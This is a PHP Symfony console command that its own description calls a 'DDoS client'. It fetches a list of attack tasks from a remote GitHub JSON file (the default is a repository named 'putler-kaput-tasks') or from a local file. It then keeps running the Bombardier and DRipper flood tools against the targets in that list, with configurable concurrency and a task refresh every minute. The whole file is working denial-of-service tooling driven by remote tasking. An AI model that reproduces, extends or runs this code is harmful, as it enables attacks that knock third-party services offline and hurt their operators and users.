<?php

declare(strict_types=1);

namespace App\Command;

use App\AppRunner\AppRunner;
use App\AppRunner\BombardierRunner;
use App\AppRunner\DNSPerfRunner;
use App\AppRunner\DRipperRunner;
use App\Struct\Task;
use App\Struct\TaskApp;
use App\TasksProvider\FileTasksProvider;
use App\TasksProvider\GuzzleTasksProvider;
use App\TasksProvider\TasksProvider;
use DateTimeImmutable;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputDefinition;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Output\OutputInterface;
use function array_filter;
use function array_map;
use function array_merge;
use function array_pop;
use function json_decode;
use function pcntl_async_signals;
use function pcntl_signal;
use function sprintf;
use function usleep;
use const SIGTERM;

class RunClientCommand extends Command
{
    private string $lastPayload = '';
    /**
     * @var list<Task>
     */
    private array $currentTasks = [];
    /**
     * @var list<AppRunner>
     */
    private array $activeRunners = [];
    /**
     * @var list<Task>
     */
    private array $queue = [];
    private DateTimeImmutable $tasksUpdatedAt;
    private bool $mustStop = false;
    private TasksProvider $tasksProvider;

    public function __construct(string $name = null)
    {
        parent::__construct($name);
        $this->tasksUpdatedAt = DateTimeImmutable::createFromFormat('U', '0');
    }

    private function registerSignalHandler(): void
    {
        pcntl_async_signals(true);
        pcntl_signal(SIGTERM, [$this, 'handleSignal']);
        pcntl_signal(SIGINT, [$this, 'handleSignal']);
    }


    public function handleSignal(int $signal): void
    {
        $this->mustStop = true;
    }

    protected function configure(): void
    {
        $this
            ->setName('app:client:run')
            ->setDescription('Run a DDoS client')
            ->setDefinition(
                new InputDefinition(
                    [
                        new InputOption('concurrency', 'c', InputOption::VALUE_REQUIRED, '', '2'),
                        new InputOption('tasks-file', 'f', InputOption::VALUE_OPTIONAL, 'Takes precedence over tasks-url.'),
                        new InputOption('tasks-url', 'u', InputOption::VALUE_OPTIONAL, ''),
                    ]
                )
            );
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $this->registerSignalHandler();
        $maxConcurrentTasks = (int) $input->getOption('concurrency');
        $this->resolveTasksSource($input);
        while (true) {
            if ($this->mustStop) {
                $this->stop();
                break;
            }
            $this->updateTasks();
            if ($this->queue === []) {
                $this->pushToQueue();
            }
            $this->checkRunningTasks();
            if (count($this->activeRunners) >= $maxConcurrentTasks) {
                usleep(100000);
                continue;
            }
            $task = array_pop($this->queue);
            if ($task === null) {
                continue;
            }
            $runner = $this->createRunner($task);
            $runner->run();
            $this->activeRunners[] = $runner;
            // TODO: run tasks in coroutines to prevent blocking IO
        }

        return Command::SUCCESS;
    }

    private function checkRunningTasks(): void
    {
        foreach ($this->activeRunners as $key => $runner) {
            if ($runner->isCompleted()) {
                unset($this->activeRunners[$key]);
            }
        }
    }
    private function createRunner(Task $task): AppRunner
    {
        $runner = match ($task->app) {
            TaskApp::BOMBARDIER => new BombardierRunner($task),
            TaskApp::DRIPPER => new DRipperRunner($task),
            TaskApp::DNSPERF => new DNSPerfRunner($task),
        };

        return $runner;
    }

    private function updateTasks(): void
    {
        if ($this->tasksUpdatedAt->modify('+1 minute') > new DateTimeImmutable()) {
            // Prevent frequent updates.
            return;
        }
        $payload = $this->getTasks();
        if ($payload === '') {
            // Error
            return;
        }
        $this->tasksUpdatedAt = new DateTimeImmutable();
        if ($this->lastPayload === $payload) {
            // no changes
            return;
        }
        $payloadArr = json_decode($payload, true, 512, JSON_THROW_ON_ERROR);
        $payloadArr = array_filter($payloadArr, static fn(array $taskArr) => $taskArr['enabled'] && $taskArr['app'] !== 'dnsperf');
        $tasks = array_map(
            static fn(array $taskArr) => Task::fromArray($taskArr),
            $payloadArr
        );
        $this->currentTasks = $tasks;
    }

    private function getTasks(): string
    {
        return $this->tasksProvider->getTasks();
    }

    private function pushToQueue(): void
    {
        $this->queue = array_merge($this->currentTasks, $this->queue);
    }

    private function stop(): void
    {
        foreach ($this->activeRunners as $runner) {
            $runner->stop();
        }
    }

    private function resolveTasksSource(InputInterface $input): void
    {
        $tasksFile = $input->getOption('tasks-file');
        $tasksUrl = $input->getOption('tasks-url');
        if ($tasksFile !== null) {
            $this->tasksProvider = new FileTasksProvider($tasksFile);
        } else {
            if ($tasksUrl === null) {
                $tasksUrl = 'https://raw.githubusercontent.com/supersmile2009/putler-kaput-tasks/master/tasks.json';
            }
            $this->tasksProvider = new GuzzleTasksProvider($tasksUrl);
        }
    }
}
